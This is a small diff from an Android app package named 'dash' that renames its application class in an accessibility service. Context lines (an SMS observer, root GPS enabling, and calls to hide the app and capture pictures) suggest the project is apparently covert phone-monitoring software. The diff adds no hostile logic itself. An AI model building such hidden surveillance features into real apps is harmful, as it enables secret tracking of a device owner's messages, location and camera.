@@ -12,7 +12,7 @@ import android.os.Handler
 import android.provider.Telephony
 import androidx.core.app.ActivityCompat
 import android.view.accessibility.AccessibilityEvent
-import com.github.muneebwanee.dash.app.IsTheApp
+import com.github.muneebwanee.dash.app.dash
 import com.github.muneebwanee.dash.services.sms.SmsObserver
 import com.github.muneebwanee.dash.utils.ConstFun.enableGpsRoot
 import com.github.muneebwanee.dash.utils.ConstFun.getDateTime
@@ -37,7 +37,7 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
 
     override fun onCreate() {
         super.onCreate()
-        IsTheApp.appComponent.inject(this)
+        dash.appComponent.inject(this)
         getLocation()
         interactor.getShowOrHideApp()
         interactor.getCapturePicture()
